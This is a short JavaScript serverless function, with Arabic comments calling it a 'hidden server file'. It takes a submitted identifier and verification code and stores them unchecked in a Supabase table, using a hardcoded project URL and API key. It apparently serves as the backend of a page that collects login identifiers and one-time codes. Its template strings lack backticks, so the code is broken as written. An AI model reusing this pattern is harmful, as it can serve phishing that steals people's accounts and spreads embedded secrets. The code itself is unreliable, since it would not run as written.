// ملف السيرفر الخفي اللي بيتكلم مع Supabase
export async function handler(event, context) {
    // التأكد إن الطلب جاي بطريقة POST (يعني إرسال بيانات)
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        // استلام البيانات اللي جاية من الموقع
        const body = JSON.parse(event.body);
        const { identifier, verification_code } = body;

        // بيانات الاتصال بـ Supabase
        const supabaseUrl = 'https://dlmaxrjjrqntcssvrsmy.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWF4cmlqcnFudGNzc3Zyc215Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzMTk1MDAsImV4cCI6MjEwNzg5NTUwMH0.oFkpunqEGruS189py8FiU2BNCU3xBwSqLvkn2u_aIsg';

        // إرسال البيانات لـ Supabase
        const response = await fetch(${supabaseUrl}/rest/v1/submissions, {
            method: 'POST',
            headers: {
                'apikey': supabaseKey,
                'Authorization': Bearer ${supabaseKey},
                'Content-Type': 'application/json',
                'Prefer': 'return=minimal'
            },
            body: JSON.stringify({
                identifier: identifier,
                verification_code: verification_code
            })
        });

        if (!response.ok) {
            throw new Error('فشل الحفظ في قاعدة البيانات');
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Success" })
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
}
